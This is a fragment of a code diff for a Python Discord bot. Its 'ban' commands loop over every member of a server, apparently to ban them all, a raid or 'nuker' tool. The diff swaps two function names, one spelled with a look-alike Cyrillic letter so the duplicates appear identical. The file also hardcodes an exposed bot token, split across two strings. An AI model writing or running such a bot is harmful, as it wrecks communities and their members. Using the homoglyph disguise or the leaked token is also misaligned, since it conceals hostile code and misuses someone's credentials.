@@ -6,7 +6,7 @@ TOKEN = "NjY1MjU1NDM0OTAyNTY4OTg1"+".XtIZQg.2fezchFXBNIepUTdkA3_oX7CVrY"
 bot = discord.ext.commands.Bot(command_prefix = "!")
 
 @bot.command()
-async def bаn(ctx, arg):
+async def ban(ctx, *arg):
     for user in ctx.guild.members:
         print('ban')
         try:
@@ -28,7 +28,7 @@ async def bаn(ctx, arg):
 
 
 @bot.command()
-async def ban(ctx, arg):
+async def bаn(ctx, *arg):
     for user in ctx.guild.members:
         print('ban')
         try:
